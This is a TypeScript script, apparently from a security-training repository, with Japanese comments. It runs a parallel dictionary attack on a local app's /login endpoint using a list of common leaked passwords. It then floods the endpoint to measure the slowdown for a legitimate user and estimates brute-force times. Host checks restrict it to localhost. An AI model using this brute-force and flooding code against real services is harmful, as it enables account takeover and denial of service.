// 狙う攻撃: /login へのパスワード総当たり(辞書攻撃)と、ログインの大量送信によるサーバーの詰まり。
// 前提条件: /login に試行回数の制限がない。apps/phase1 のサーバーが localhost:3000 で起動している。
//
// 使い方(リポジトリのルートで): node attacks/phase1-bruteforce/bruteforce.ts
//
// やること
//   1. 被害者ユーザーを、よくあるパスワードで登録する
//   2. 1 件ずつ試して、1 回の試行にかかる時間を測る
//   3. 並列で辞書攻撃し、何回目・何秒で当たるか、途中で止められたか(429 など)を見る
//   4. 大量に送っている最中に、正規ユーザーのログインにかかる時間を測る
//   5. 測った速さから、総当たりにかかる時間を見積もる

import { randomBytes } from "node:crypto";
import { setTimeout as sleep } from "node:timers/promises";

const BASE_URL = process.env.BASE_URL ?? "http://localhost:3000";
const host = new URL(BASE_URL).hostname;
if (!(host === "localhost" || host === "127.0.0.1" || host.endsWith(".local"))) {
  console.error(`ローカル以外(${host})には実行しない`);
  process.exit(1);
}

// 漏洩したパスワードのランキング上位によく出てくるもの
const WORDLIST = [
  "123456", "password", "123456789", "12345678", "12345", "qwerty", "1234567", "111111",
  "1234567890", "123123", "abc123", "1234", "password1", "iloveyou", "1q2w3e4r", "000000",
  "qwerty123", "zaq12wsx", "qwer", "asdf", "letmein", "monkey", "football", "baseball",
  "welcome", "admin", "login", "princess", "master", "sunshine", "shadow", "superman",
  "dragon", "michael", "trustno1", "passw0rd", "starwars", "whatever", "hello", "freedom",
];
const VICTIM_PASSWORD = "dragon";

type Result = { status: number; ms: number };

async function post(path: string, username: string, password: string): Promise<Result> {
  const started = performance.now();
  const res = await fetch(new URL(path, BASE_URL), {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ username, password }),
  });
  await res.arrayBuffer();
  return { status: res.status, ms: performance.now() - started };
}

const login = (username: string, password: string) => post("/login", username, password);

// concurrency 本並列で passwords を先頭から試す。当たったら止める。
async function dictionaryAttack(username: string, passwords: string[], concurrency: number) {
  let next = 0;
  let attempts = 0;
  let found: string | undefined;
  const statuses = new Map<number, number>();
  const started = performance.now();

  const worker = async () => {
    while (found === undefined) {
      const password = passwords[next++];
      if (password === undefined) break;
      const { status } = await login(username, password);
      attempts++;
      statuses.set(status, (statuses.get(status) ?? 0) + 1);
      if (status === 200) found = password;
    }
  };
  await Promise.all(Array.from({ length: concurrency }, worker));

  return { found, attempts, statuses, seconds: (performance.now() - started) / 1000 };
}

// seconds 秒のあいだ、concurrency 本並列で間違ったパスワードを送り続ける
async function flood(username: string, seconds: number, concurrency: number): Promise<number> {
  const until = performance.now() + seconds * 1000;
  let count = 0;
  const worker = async () => {
    while (performance.now() < until) {
      await login(username, `wrong-${count++}`);
    }
  };
  await Promise.all(Array.from({ length: concurrency }, worker));
  return count;
}

function humanize(seconds: number): string {
  if (seconds < 60) return `${seconds.toFixed(1)} 秒`;
  if (seconds < 3600) return `${(seconds / 60).toFixed(1)} 分`;
  if (seconds < 86400) return `${(seconds / 3600).toFixed(1)} 時間`;
  if (seconds < 86400 * 365) return `${(seconds / 86400).toFixed(1)} 日`;
  return `${(seconds / 86400 / 365).toExponential(1)} 年`;
}

const average = (xs: number[]) => xs.reduce((a, b) => a + b, 0) / xs.length;

try {
  const victim = `victim-${randomBytes(3).toString("hex")}`;
  const legit = `legit-${randomBytes(3).toString("hex")}`;
  const legitPassword = randomBytes(12).toString("base64");
  await post("/register", victim, VICTIM_PASSWORD);
  await post("/register", legit, legitPassword);
  console.log(`被害者: ${victim}(パスワードは辞書の ${WORDLIST.indexOf(VICTIM_PASSWORD) + 1} 番目)`);

  console.log("\n[1] 1 件ずつ 5 回試す");
  const single: number[] = [];
  for (let i = 0; i < 5; i++) single.push((await login(victim, `wrong-${i}`)).ms);
  console.log(`  1 回あたり 平均 ${average(single).toFixed(0)} ms`);

  console.log("\n[2] 8 並列で辞書攻撃");
  const attack = await dictionaryAttack(victim, WORDLIST, 8);
  const rate = attack.attempts / attack.seconds;
  console.log(`  結果: ${attack.found === undefined ? "見つからず" : `「${attack.found}」で突破`}`);
  console.log(`  試行 ${attack.attempts} 回 / ${attack.seconds.toFixed(1)} 秒(毎秒 ${rate.toFixed(1)} 回)`);
  console.log(`  ステータスの内訳: ${[...attack.statuses].map(([s, n]) => `${s} × ${n}`).join(", ")}`);

  console.log("\n[3] 16 並列で送り続けている最中に、正規ユーザーがログインする");
  const before = (await login(legit, legitPassword)).ms;
  const flooding = flood(victim, 8, 16);
  await sleep(1500);
  const during: number[] = [];
  for (let i = 0; i < 3; i++) during.push((await login(legit, legitPassword)).ms);
  const sent = await flooding;
  console.log(`  正規ユーザーのログイン: 平常時 ${before.toFixed(0)} ms → 攻撃中 平均 ${average(during).toFixed(0)} ms`);
  console.log(`  攻撃側が送った回数: 8 秒で ${sent} 回`);

  console.log(`\n[4] 毎秒 ${rate.toFixed(1)} 回のまま試し続けた場合の見積もり`);
  const estimates: [string, number][] = [
    ["よくあるパスワード上位 1 万件", 1e4],
    ["英小文字 8 文字のすべて(26^8)", 26 ** 8],
    ["印字可能な ASCII 8 文字のすべて(94^8)", 94 ** 8],
  ];
  for (const [label, count] of estimates) console.log(`  ${label}: ${humanize(count / rate)}`);
} catch (err) {
  if ((err as { cause?: { code?: string } }).cause?.code === "ECONNREFUSED") {
    console.error(`${BASE_URL} に接続できません。サーバーを起動してから実行してください。`);
    process.exit(1);
  }
  throw err;
}
